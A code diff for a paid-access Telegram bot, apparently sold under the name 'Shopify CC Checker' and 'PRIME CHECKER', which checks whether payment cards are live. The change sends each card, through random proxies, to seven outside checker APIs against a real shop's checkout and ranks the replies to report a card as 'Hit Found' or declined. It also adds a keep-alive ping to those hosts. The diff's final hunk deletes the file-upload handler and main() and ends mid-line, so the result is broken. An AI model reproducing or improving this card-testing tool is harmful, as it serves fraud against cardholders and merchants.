@@ -28,21 +28,27 @@ def run_server():
     server = HTTPServer(("0.0.0.0", port), SimpleHandler)
     server.serve_forever()
 
-# 🚀 Self-Ping function to prevent Render/Railway from sleeping
+# 🚀 Self-Ping function (Keeps all 7 URLs active)
 def keep_alive_ping():
     railway_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RENDER_EXTERNAL_URL")
-    if not railway_url:
-        return
-    if not railway_url.startswith("http"):
-        railway_url = f"https://{railway_url}"
-        
+    
+    extra_urls = [
+        "https://cozy-abundance-production-88ca.up.railway.app/status",
+        "https://lucid-flow-production-ebd1.up.railway.app/status"
+    ]
+    
     while True:
         try:
             with httpx.Client(timeout=10.0) as client:
-                client.get(railway_url)
-                logger.info("Self-ping sent to keep bot alive!")
-        except Exception as e:
-            logger.error(f"Self-ping failed: {e}")
+                if railway_url:
+                    main_url = railway_url if railway_url.startswith("http") else f"https://{railway_url}"
+                    client.get(main_url)
+                
+                for api_url in extra_urls:
+                    client.get(api_url)
+        except Exception:
+            pass
+            
         time.sleep(240)
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -140,7 +146,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     welcome_text = (
         f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online (5-API Active)\n"
+        f"🤖 Shopify CC Checker Bot is Online (7 APIs Best Response Selector Active)\n"
         f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
@@ -253,7 +259,6 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user.id in BANNED_USERS or not context.args:
         return
     
-    # 🛑 Check if user already has an active subscription
     if user.id in USER_SUBSCRIPTIONS:
         expiry = USER_SUBSCRIPTIONS[user.id]
         if time.time() < expiry:
@@ -261,7 +266,6 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Aapki purani subscription abhi active hai!\n⏳ Expiry Time: **{rem_time}**\n\nAap apni purani key ki expiry ke baad hi nayi key redeem kar sakte hain.", parse_mode="Markdown")
             return
         else:
-            # Purani expiry khatam ho chuki hai, toh record hata dein
             del USER_SUBSCRIPTIONS[user.id]
 
     k = context.args[0].upper()
@@ -337,33 +341,57 @@ async def process_card_string(card_line, user, context):
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
         site_url = "https://artpop.com"
-        selected_proxies = random.sample(PROXY_LIST, min(5, len(PROXY_LIST)))
+        selected_proxies = random.sample(PROXY_LIST, min(7, len(PROXY_LIST)))
         
         res_data = None
         async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
+            # 🌐 All 7 APIs URLs Configured for Card Checking & Best Response Selection
             url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
             url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
             url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
             url_4 = f"https://shopix.up.railway.app/shopii?cc={quote(formatted_cc)}&site={quote(site_url)}&proxy={quote(selected_proxies[3])}"
             url_5 = f"http://shopii-api-production.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[4])}"
             
+            # Aapke 2 naye URLs ko bhi card checking format mein add kar diya gaya hai
+            url_6 = f"https://cozy-abundance-production-88ca.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[5])}"
+            url_7 = f"https://lucid-flow-production-ebd1.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[6])}"
+            
             tasks = [
                 fetch_api(client, url_1),
                 fetch_api(client, url_2),
                 fetch_api(client, url_3),
                 fetch_api(client, url_4),
-                fetch_api(client, url_5)
+                fetch_api(client, url_5),
+                fetch_api(client, url_6),
+                fetch_api(client, url_7)
             ]
             
             completed = await asyncio.gather(*tasks)
+            
+            # 🎯 7 APIs Best Response Selector Logic
+            valid_responses = []
             for res in completed:
                 if res and isinstance(res, dict):
-                    if "Response" in res or "Approved" in res or "Charged" in res:
-                        res_data = res
-                        break
+                    resp_status = str(res.get("Response", "")).lower()
+                    approved = str(res.get("Approved", "false")).lower()
+                    charged = str(res.get("Charged", "false")).lower()
+                    
+                    score = 0
+                    if approved == "true" or charged == "true" or "success" in resp_status or "approved" in resp_status or "hit" in resp_status:
+                        score = 10
+                    elif "site error" not in resp_status and "error" not in resp_status and resp_status != "":
+                        score = 5
+                    else:
+                        score = 1
+                        
+                    valid_responses.append((score, res))
+            
+            if valid_responses:
+                valid_responses.sort(key=lambda x: x[0], reverse=True)
+                res_data = valid_responses[0][1]
 
         if not res_data:
-            return f"❌ {card_line} ➔ All 5 APIs & Proxies failed/timed out."
+            return f"❌ {card_line} ➔ All 7 APIs & Proxies failed/timed out."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -371,7 +399,7 @@ async def process_card_string(card_line, user, context):
         approved = str(res_data.get("Approved", "False"))
         charged = str(res_data.get("Charged", "False"))
         
-        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
+        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower() or "hit" in resp_status.lower())
         hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
         
         masked_cc = f"{cc[:6]}******{cc[-4:]}|{mes}|{ano}|{cvv}" if len(cc) >= 10 else "******"
@@ -398,7 +426,7 @@ async def process_card_string(card_line, user, context):
                 pass
 
         return (
-            f"⚡💳  # PRIME CHECKER  💳⚡\n"
+            f"⚡💳  # PRIME CHECKER (7 APIs) 💳⚡\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"{hit_title}\n"
             f"⚠️ Status: {resp_status}\n"
@@ -411,7 +439,7 @@ async def process_card_string(card_line, user, context):
             f"👤 Checked By ➠ {user.first_name}"
         )
     except Exception:
-        return f"❌ {card_line} ➔ Er@or occurred."
+        return f"❌ {card_line} ➔ Error occurred."
 
 card_semaphore = asyncio.Semaphore(5)
 
@@ -428,7 +456,7 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if not context.args:
         return
-    msg = await update.message.reply_text("⏳ Processing with 5 APIs & Proxies...")
+    msg = await update.message.reply_text("⏳ Checking across 7 APIs & selecting best response...")
     result = await process_card_string(" ".join(context.args), update.effective_user, context)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
@@ -447,7 +475,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_lines:
         return
 
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 5 APIs...")
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards via 7 APIs...")
     tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
     results = await asyncio.gather(*tasks)
     
@@ -460,62 +488,4 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS or not has_access(user_id):
-        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
-        return
-    document = update.message.document
-    if not document:
-        return
-    
-    status_msg = await update.message.reply_text("⏳ Processing file via 5 APIs...")
-    try:
-        file = await context.bot.get_file(document.file_id)
-        file_bytes = await file.download_as_bytearray()
-        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
-        
-        tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
-        results = await asyncio.gather(*tasks)
-        
-        final_output = "\n\n".join(results)[:4000]
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
-    except Exception:
-        pass
-
-def main():
-    if not TOKEN:
-        return
-    
-    threading.Thread(target=run_server, daemon=True).start()
-    threading.Thread(target=keep_alive_ping, daemon=True).start()
-    
-    app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_bot))
-    app.add_handler(CommandHandler("startall", start_all_bot))
-    app.add_handler(CommandHandler("admin", admin_pannel))
-    app.add_handler(CommandHandler("adminpannel", admin_pannel))
-    app.add_handler(CommandHandler("makeadmin", make_admin))
-    app.add_handler(CommandHandler("removeadmin", remove_admin))
-    app.add_handler(CommandHandler("ban", ban_user))
-    app.add_handler(CommandHandler("unban", unban_user))
-    app.add_handler(CommandHandler("key", generate_key))
-    app.add_handler(CommandHandler("listkeys", list_active_keys))
-    app.add_handler(CommandHandler("keyreset", key_reset_command))
-    app.add_handler(CommandHandler("redeem", redeem_key))
-    app.add_handler(CommandHandler("chk", chk_card))
-    app.add_handler(CommandHandler("chks", chks_cards))
-    app.add_handler(CommandHandler("chf", chf_file_check))
-    app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
-    
-    while True:
-        try:
-            logger.info("Starting bot polling...")
-            app.run_polling(drop_pending_updates=True)
-        except Exception as e:
-            logger.error(f"Polling crashed: {e}, restarting in 5 seconds...")
-            time.sleep(5)
-
-if __name__ == "__main__":
-    main()
+    user_id = update
